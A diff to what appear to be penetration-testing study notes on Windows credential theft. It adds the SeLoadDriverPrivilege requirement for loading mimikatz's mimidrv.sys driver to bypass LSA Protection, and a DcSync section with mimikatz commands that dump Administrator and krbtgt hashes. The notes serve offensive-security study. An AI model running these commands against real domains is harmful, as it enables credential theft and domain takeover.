@@ -112,7 +112,7 @@ C:\minidump.exe c:\windows\tasks\lsass.dmp
 When the popularity of cached credential retrieving raised, Microsoft introduced 2 secuirty measures: LSA Protection and Windows Defender Credential Guard. The LSA protection added an additional process 
 security layer, the Process Protected Light(PPL), which is placed on top of the highest integrity level. This means that SYSTEM level privileges aren't enough to dump the LSASS.
 
-To solve this problem mimikatz relased the [mimidrv.sys](releases/tag/2.2.0-20220919)(go to releases and mimidrv.sys is located inside the .zip/.7z). To load this driver we must have this ??? additional privilege.
+To solve this problem mimikatz relased the [mimidrv.sys](releases/tag/2.2.0-20220919)(go to releases and mimidrv.sys is located inside the .zip/.7z). To load this driver we must have this SeLoadDriverPrivilege additional privilege.
 
 ```
 C:\Windows\system32> sc create mimidrv binPath= C:\inetpub\wwwroot\upload\mimidrv.sys type= kernel start= demand
@@ -145,5 +145,19 @@ The NTDS.dit, is a database that is usually stored on the Domain Controllers. Th
 
 **DcSync:**
 
+The main advantatge of this techique is that is less noisy than dumping the NTDS
+The domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges.
+
+In a nutshell, to be able to perform DcSync we must: be a domain admin or make the DcSync from a computer that has domain replication permissions.
+
+```
+#From a mimikatz shell
+
+1. lsadump::dcsync /user:Administrator
+
+or
+
+2. lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+```
 
 **Meterpreter:**
